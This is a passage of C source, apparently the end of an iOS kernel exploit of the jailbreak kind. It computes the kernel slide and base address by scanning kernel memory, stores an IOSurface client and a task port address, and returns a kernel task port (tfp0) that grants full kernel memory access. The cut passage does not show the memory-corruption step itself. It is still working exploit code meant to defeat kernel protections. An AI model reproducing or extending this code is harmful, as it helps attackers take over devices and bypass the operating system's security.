            kernel_base -= 0x1000;
        } while (true);
        uint64_t kernel_slide = (kernel_base - kernel_image_base);
        printf("[*] REAL kernel slide: 0x%llx\n", kernel_slide);
        printf("[*] REAL kernel base: 0x%llx\n", kernel_base);
        slidefromkernelmemory = kernel_slide;
        basefromkernelmemory = kernel_base;
        printf("[*] kernel_slide_EXPORTED_SP: 0x%llx\n", slidefromkernelmemory);
        printf("[*] kernel_base_EXPORTED_SP: 0x%llx\n", basefromkernelmemory);

    out:

        newClientSP = client;
        printf("[*] newClientSP   = 0x%x\n",newClientSP);
        printf("[*] new_SP_task_port_kaddr  = 0x%llx\n",new_SP_task_port_kaddr);
        
    
    

    deinit_IOSurface_SP();
    
    
    set_tfp0(new_tfp0);
    return new_tfp0;
    
    
err:
    if (SMAP) {
        if (fds[0] != -1)  close(fds[0]);
        if (fds[1] != -1)  close(fds[1]);
    }
    deinit_IOSurface_SP();
    return MACH_PORT_NULL;
}
